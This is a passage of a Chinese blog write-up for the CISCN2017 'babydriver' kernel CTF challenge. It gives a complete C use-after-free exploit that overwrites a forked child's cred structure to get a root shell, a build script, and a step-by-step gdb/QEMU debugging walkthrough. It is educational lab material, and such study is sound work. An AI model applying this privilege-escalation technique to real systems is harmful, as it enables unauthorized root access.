+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">,</span>id<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> cred<span class="token punctuation">[</span><span class="token number">0xa8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/babydev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"dev/babydev"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//修改babydev_struct.device_len为0xa8</span>
+    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放fd1</span>
+    id <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fork一个新进程</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span>cred<span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向fd2的babydev_struct.device_buf中写入28个0</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]welcome root:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得root权限</span>
+            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]fork fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>将exp静态编译，放入rootfs中：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325211224198.png"></p>
+<p>打包成rootfs.cpio</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token comment">#判断是否是root权限</span>
+<span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">env</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"^USER"</span> <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-d</span> <span class="token string">"="</span> <span class="token parameter variable">-f</span> <span class="token number">2</span><span class="token variable">)</span></span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$user</span>"</span> <span class="token operator">!=</span> <span class="token string">"root"</span>  <span class="token punctuation">]</span>
+  <span class="token keyword">then</span>
+    <span class="token builtin class-name">echo</span> <span class="token string">"请使用 root 权限执行"</span>
+    <span class="token builtin class-name">exit</span>
+<span class="token keyword">fi</span>
+
+<span class="token comment">#静态编译exp</span>
+gcc exp.c <span class="token parameter variable">-static</span> <span class="token parameter variable">-o</span> rootfs/exp
+
+
+<span class="token comment">#打包</span>
+<span class="token builtin class-name">cd</span> rootfs
+<span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.cpio
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span></code></pre>
+
+
+
+<h4 id="调试exp"><a href="#调试exp" class="headerlink" title="调试exp"></a>调试exp</h4><p>调试建议</p>
+<p>调试的boot.sh:关闭了一些保护</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
+qemu-system-x86_64 <span class="token punctuation">\</span>
+    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>
+    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-kernel</span> ./bzImage <span class="token punctuation">\</span>
+    <span class="token parameter variable">-initrd</span>  ./rootfs.img <span class="token punctuation">\</span>
+    <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-cpu</span> kvm64 <span class="token parameter variable">-gdb</span> tcp::1234</code></pre>
+
+
+
+<p>1、提取vmlinux</p>
+<pre class="language-none"><code class="language-none">.&#x2F;extract-vmlinux .&#x2F;bzImage &gt; vmlinux</code></pre>
+
+<p>2、启动gdb</p>
+<pre class="language-none"><code class="language-none">gdb .&#x2F;vmlinux -q</code></pre>
+
+<p>3、运行调试boot.sh</p>
+<p>查看符号表</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325211020002.png"></p>
+<p>在gdb中导入符号表</p>
+<pre class="language-none"><code class="language-none">add-symbol-file .&#x2F;rootfs&#x2F;lib&#x2F;modules&#x2F;4.4.72&#x2F;babydriver.ko 0xffffffffc0000000</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325211057066.png"></p>
+<p>在gdb中监听1234端口</p>
+<pre class="language-none"><code class="language-none">target remote 127.0.0.1:1234</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325211628686.png"></p>
+<h4 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h4><p>在babyopen，babyioctl，babywrite下断点</p>
+<pre class="language-none"><code class="language-none">b babyopen
+b babyioctl
+b babywrite</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325211932001.png"></p>
+<p>在qemu中运行exp</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325211950899.png" style="zoom: 67%;" />
+
+
+
+<p>&#x3D;&#x3D;》此时gdb已经在第一个babyopen处断点</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212039584.png"></p>
+<p>单步运行至为babydev_struct赋值的语句：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212327842.png"></p>
+<p>&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212432544.png"></p>
+<p>&#x3D;&#x3D;》</p>
+<p>babydev_struct.device_buf的地址为0xffffffffc00024d0</p>
+<p>babydev_struct.device_len的地址为0xffffffffc00024d8</p>
+<p>&#x3D;&#x3D;》查看内内容（未赋值前）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212617669.png"></p>
+<p>此时其中内容都为空</p>
+<p>&#x3D;&#x3D;》查看内容（赋值后）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212705300.png"></p>
+<p>查看buffer内容</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212842549.png"></p>
+<p>继续运行至第二个babyopen</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212949469.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325212958687.png"></p>
+<p>单步运行至赋值后，查看地址内内容</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213054160.png"></p>
+<p>&#x3D;&#x3D;》为第一次babyopen赋值，没有改变</p>
+<p>&#x3D;&#x3D;》查看buffer内容</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213257403.png"></p>
+<p>&#x3D;&#x3D;》得到了重新分配</p>
+<p>继续运行至babyioctl：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213438443.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213455685.png"></p>
+<p>单步运行至重新赋值处</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213635056.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213557088.png"></p>
+<p>&#x3D;&#x3D;》查看赋值后内容：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213735574.png"></p>
+<p>&#x3D;&#x3D;&#x3D;》buffer进行了重新分配，大小变为了0xa8&#x3D;&#x3D;》cred结构体的大小</p>
+<p>查看buffer内容：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325213902454.png"></p>
+<p>继续运行至babywrite处：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325214020302.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325214031822.png"></p>
+<p>&#x3D;&#x3D;》此时fork函数执行结束，子进程的cred结构体被放入babydev_struct.dev_buf指向的区域</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325214310938.png"></p>
+<p>单步运行至函数返回处&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325214531116.png"></p>
+<p>&#x3D;&#x3D;&#x3D;》前28个字节被覆盖为0&#x3D;&#x3D;》</p>
+<p>继续运行（ c ）：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325214631611.png"></p>
+<p>提权成功</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/03/23/Kernel%E5%9F%BA%E7%A1%80/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-24 20:13:45
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Kernel/" title="Kernel">
+                        #Kernel
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/29/ret2dl-resolve/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#kernel-UAF"><span class="toc-text">kernel UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2017-babydriver"><span class="toc-text">CISCN2017 - babydriver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="toc-text">查看文件属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babydriver-init"><span class="toc-text">babydriver_init</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babydriver-init%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">babydriver_init函数总结：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babydriver-exit"><span class="toc-text">babydriver_exit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyopen"><span class="toc-text">babyopen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyrelease"><span class="toc-text">babyrelease</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyread"><span class="toc-text">babyread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyioctl"><span class="toc-text">babyioctl</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-text">思路总结与动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95exp"><span class="toc-text">调试exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">调试过程：</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Kernel%20UAF + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F24%2FKernel-UAF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/24/Kernel-UAF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
